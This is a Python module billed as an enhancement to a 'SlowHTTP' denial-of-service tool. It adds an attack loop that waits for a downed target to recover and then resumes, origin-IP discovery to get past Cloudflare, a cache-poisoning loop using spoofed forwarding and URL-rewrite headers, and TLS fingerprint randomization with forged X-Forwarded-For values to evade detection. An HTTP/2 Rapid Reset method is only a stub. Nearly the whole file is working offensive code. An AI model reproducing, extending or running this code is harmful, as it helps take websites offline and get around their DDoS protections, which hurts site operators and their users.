#!/usr/bin/env python3
"""
SlowHTTP v2 Enhancement Module
Adds persistent attack, DNS history, and Cloudflare bypass capabilities
"""

import time
import socket
import threading
import random
import json
import logging
from typing import Dict, List, Optional, Tuple
from datetime import datetime
import requests
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class TargetHealthMonitor:
    """
    Monitors target health and manages automatic reconnection
    """
    def __init__(self, target: str, port: int, use_ssl: bool = False):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.is_alive = False
        self.last_check = None
        self.consecutive_failures = 0
        self.check_interval = 5  # seconds
        self.max_failures = 3
        
    def check_target_health(self) -> bool:
        """Check if target is responsive"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result == 0:
                self.is_alive = True
                self.consecutive_failures = 0
                logger.info(f"Target {self.target}:{self.port} is alive")
                return True
            else:
                self.is_alive = False
                self.consecutive_failures += 1
                logger.warning(f"Target {self.target}:{self.port} is down (attempt {self.consecutive_failures})")
                return False
                
        except Exception as e:
            self.is_alive = False
            self.consecutive_failures += 1
            logger.error(f"Health check failed: {str(e)}")
            return False
    
    def wait_for_recovery(self, max_wait: int = 300) -> bool:
        """Wait for target to recover"""
        logger.info(f"Waiting for target {self.target}:{self.port} to recover...")
        start_time = time.time()
        
        while time.time() - start_time < max_wait:
            if self.check_target_health():
                logger.info(f"Target recovered after {int(time.time() - start_time)} seconds")
                return True
            
            # Exponential backoff
            wait_time = min(30, 5 * (2 ** min(self.consecutive_failures, 5)))
            logger.info(f"Target still down, waiting {wait_time} seconds before retry...")
            time.sleep(wait_time)
        
        logger.error(f"Target did not recover within {max_wait} seconds")
        return False


class PersistentAttackManager:
    """
    Manages persistent attacks that continue even when target goes down
    """
    def __init__(self, attacker, target: str, port: int, use_ssl: bool = False):
        self.attacker = attacker
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.health_monitor = TargetHealthMonitor(target, port, use_ssl)
        self.running = False
        self.paused = False
        self.attack_thread = None
        self.monitor_thread = None
        self.stats = {
            "total_attacks": 0,
            "successful_attacks": 0,
            "failed_attacks": 0,
            "total_downtime": 0,
            "recoveries": 0
        }
        
    def start_persistent_attack(self, attack_func, *args, **kwargs):
        """Start attack with automatic recovery"""
        self.running = True
        self.attack_thread = threading.Thread(
            target=self._persistent_attack_loop,
            args=(attack_func, args, kwargs)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Start health monitoring
        self.monitor_thread = threading.Thread(target=self._monitor_loop)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
    def _persistent_attack_loop(self, attack_func, args, kwargs):
        """Main persistent attack loop"""
        while self.running:
            try:
                if not self.paused:
                    logger.info(f"Starting attack iteration {self.stats['total_attacks'] + 1}")
                    self.stats['total_attacks'] += 1
                    
                    # Execute attack
                    attack_func(*args, **kwargs)
                    
                    self.stats['successful_attacks'] += 1
                    
                else:
                    # Attack is paused, wait for recovery
                    time.sleep(1)
                    
            except (ConnectionRefusedError, socket.timeout, OSError) as e:
                logger.warning(f"Attack interrupted: {str(e)}")
                self.stats['failed_attacks'] += 1
                self._handle_target_down()
                
            except Exception as e:
                logger.error(f"Unexpected error in attack loop: {str(e)}")
                self.stats['failed_attacks'] += 1
                time.sleep(5)
    
    def _monitor_loop(self):
        """Monitor target health continuously"""
        while self.running:
            if not self.paused:
                if not self.health_monitor.check_target_health():
                    self._handle_target_down()
            
            time.sleep(self.health_monitor.check_interval)
    
    def _handle_target_down(self):
        """Handle target going down"""
        logger.warning("Target is down, pausing attack...")
        self.paused = True
        downtime_start = time.time()
        
        # Wait for target to recover
        if self.health_monitor.wait_for_recovery():
            downtime = time.time() - downtime_start
            self.stats['total_downtime'] += downtime
            self.stats['recoveries'] += 1
            
            logger.info(f"Target recovered, resuming attack (downtime: {int(downtime)}s)")
            self.paused = False
        else:
            logger.error("Target recovery timeout, stopping attack")
            self.running = False
    
    def stop(self):
        """Stop persistent attack"""
        logger.info("Stopping persistent attack manager...")
        self.running = False
        if self.attack_thread:
            self.attack_thread.join(timeout=5)
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)


class DNSHistoryTool:
    """
    DNS History and Subdomain Discovery Tool
    Finds historical IPs and subdomains (especially non-Cloudflare IPs)
    """
    def __init__(self):
        self.results = {
            "subdomains": [],
            "historical_ips": [],
            "current_ips": [],
            "non_cloudflare_ips": [],
            "dns_records": {}
        }
        
        # Cloudflare IP ranges (simplified)
        self.cloudflare_ranges = [
            "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
            "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
            "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
            "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
            "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
        ]
    
    def is_cloudflare_ip(self, ip: str) -> bool:
        """Check if IP belongs to Cloudflare"""
        try:
            import ipaddress
            ip_obj = ipaddress.ip_address(ip)
            for cidr in self.cloudflare_ranges:
                if ip_obj in ipaddress.ip_network(cidr):
                    return True
            return False
        except:
            return False
    
    def enumerate_subdomains(self, domain: str) -> List[str]:
        """Enumerate subdomains using common prefixes"""
        subdomains = []
        common_prefixes = [
            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop", "ns1", "ns2",
            "cpanel", "whm", "autodiscover", "autoconfig", "m", "mobile", "api",
            "dev", "staging", "test", "portal", "vpn", "remote", "blog", "shop",
            "store", "cdn", "static", "media", "img", "images", "video", "download"
        ]
        
        logger.info(f"Enumerating subdomains for {domain}...")
        
        for prefix in common_prefixes:
            subdomain = f"{prefix}.{domain}"
            try:
                import dns.resolver
                answers = dns.resolver.resolve(subdomain, 'A')
                ips = [str(rdata) for rdata in answers]
                subdomains.append({
                    "subdomain": subdomain,
                    "ips": ips,
                    "is_cloudflare": any(self.is_cloudflare_ip(ip) for ip in ips)
                })
                logger.info(f"Found: {subdomain} -> {ips}")
            except:
                pass
        
        self.results["subdomains"] = subdomains
        return subdomains
    
    def get_dns_history(self, domain: str) -> Dict:
        """Get DNS history using various methods"""
        logger.info(f"Fetching DNS history for {domain}...")
        
        # Method 1: Try SecurityTrails API (requires API key)
        # Method 2: Try VirusTotal API (requires API key)
        # Method 3: Try passive DNS databases
        # Method 4: Use DNS enumeration
        
        # For now, we'll use basic DNS enumeration
        try:
            import dns.resolver
            
            # Get current A records
            try:
                answers = dns.resolver.resolve(domain, 'A')
                current_ips = [str(rdata) for rdata in answers]
                self.results["current_ips"] = current_ips
                
                # Filter non-Cloudflare IPs
                non_cf_ips = [ip for ip in current_ips if not self.is_cloudflare_ip(ip)]
                self.results["non_cloudflare_ips"] = non_cf_ips
                
                logger.info(f"Current IPs: {current_ips}")
                logger.info(f"Non-Cloudflare IPs: {non_cf_ips}")
            except:
                pass
            
            # Get other DNS records
            record_types = ['MX', 'NS', 'TXT', 'CNAME']
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    self.results["dns_records"][record_type] = [str(rdata) for rdata in answers]
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"DNS history lookup failed: {str(e)}")
        
        return self.results
    
    def find_origin_ip(self, domain: str) -> Optional[str]:
        """Try to find origin IP behind Cloudflare"""
        logger.info(f"Searching for origin IP of {domain}...")
        
        # Method 1: Check subdomains for non-Cloudflare IPs
        subdomains = self.enumerate_subdomains(domain)
        for sub in subdomains:
            if not sub["is_cloudflare"] and sub["ips"]:
                logger.info(f"Potential origin IP found via subdomain {sub['subdomain']}: {sub['ips'][0]}")
                return sub["ips"][0]
        
        # Method 2: Check MX records
        if "MX" in self.results["dns_records"]:
            for mx in self.results["dns_records"]["MX"]:
                try:
                    import dns.resolver
                    mx_host = str(mx).split()[-1].rstrip('.')
                    answers = dns.resolver.resolve(mx_host, 'A')
                    for rdata in answers:
                        ip = str(rdata)
                        if not self.is_cloudflare_ip(ip):
                            logger.info(f"Potential origin IP found via MX record: {ip}")
                            return ip
                except:
                    pass
        
        # Method 3: Check non-Cloudflare IPs from current records
        if self.results["non_cloudflare_ips"]:
            return self.results["non_cloudflare_ips"][0]
        
        logger.warning("Could not find origin IP")
        return None


class CloudflareBypassAttack:
    """
    Advanced Cloudflare Bypass Attack Techniques
    """
    def __init__(self, target: str, port: int = 80, use_ssl: bool = True):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.origin_ip = None
        self.dns_tool = DNSHistoryTool()
        
    def discover_origin_ip(self) -> Optional[str]:
        """Discover origin IP behind Cloudflare"""
        logger.info(f"Attempting to discover origin IP for {self.target}...")
        
        # Get DNS history and find origin
        self.dns_tool.get_dns_history(self.target)
        self.origin_ip = self.dns_tool.find_origin_ip(self.target)
        
        return self.origin_ip
    
    def http2_rapid_reset_attack(self, num_streams: int = 1000, duration: int = 60):
        """
        HTTP/2 Rapid Reset Attack (CVE-2023-44487)
        Exploits HTTP/2 stream cancellation
        """
        logger.info(f"Starting HTTP/2 Rapid Reset attack on {self.target}")
        
        try:
            import h2.connection
            import h2.events
            
            # This is a simplified version - full implementation would require h2 library
            logger.warning("HTTP/2 Rapid Reset attack requires additional implementation")
            
        except ImportError:
            logger.error("h2 library not available for HTTP/2 attacks")
    
    def cache_poisoning_attack(self, duration: int = 60):
        """
        Cache Poisoning Attack
        Attempts to poison Cloudflare's cache
        """
        logger.info(f"Starting Cache Poisoning attack on {self.target}")
        
        end_time = time.time() + duration
        attack_count = 0
        
        while time.time() < end_time:
            try:
                # Craft requests with cache-busting headers
                headers = {
                    'Host': self.target,
                    'X-Forwarded-Host': f'evil.{self.target}',
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Original-URL': '/admin',
                    'X-Rewrite-URL': '/admin',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                url = f"{'https' if self.use_ssl else 'http'}://{self.target}"
                response = requests.get(url, headers=headers, timeout=5)
                attack_count += 1
                
                if attack_count % 100 == 0:
                    logger.info(f"Cache poisoning attempts: {attack_count}")
                
            except Exception as e:
                logger.debug(f"Cache poisoning error: {str(e)}")
            
            time.sleep(0.1)
        
        logger.info(f"Cache poisoning attack completed: {attack_count} attempts")
    
    def ssl_fingerprint_randomization_attack(self, num_connections: int = 100):
        """
        SSL/TLS Fingerprint Randomization
        Randomizes SSL/TLS fingerprints to evade detection
        """
        logger.info(f"Starting SSL Fingerprint Randomization attack on {self.target}")
        
        import ssl
        
        for i in range(num_connections):
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Randomize cipher suites
                ciphers = [
                    'ECDHE-RSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-CHACHA20-POLY1305',
                    'DHE-RSA-AES128-GCM-SHA256'
                ]
                context.set_ciphers(':'.join(random.sample(ciphers, len(ciphers))))
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if self.origin_ip:
                    target_ip = self.origin_ip
                else:
                    target_ip = self.target
                
                sock.connect((target_ip, self.port))
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
                
                # Send randomized request
                request = self._generate_randomized_request()
                ssl_sock.send(request.encode())
                
                ssl_sock.close()
                
                if (i + 1) % 10 == 0:
                    logger.info(f"SSL fingerprint randomization: {i + 1}/{num_connections}")
                
            except Exception as e:
                logger.debug(f"SSL randomization error: {str(e)}")
    
    def _generate_randomized_request(self) -> str:
        """Generate HTTP request with randomized headers"""
        methods = ['GET', 'POST', 'HEAD']
        paths = ['/', '/index.html', '/api', '/admin']
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        request = f"{random.choice(methods)} {random.choice(paths)} HTTP/1.1\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {random.choice(user_agents)}\r\n"
        request += f"Accept: */*\r\n"
        request += f"Connection: keep-alive\r\n"
        request += f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
        request += "\r\n"
        
        return request


# Export classes
__all__ = [
    'TargetHealthMonitor',
    'PersistentAttackManager', 
    'DNSHistoryTool',
    'CloudflareBypassAttack'
]
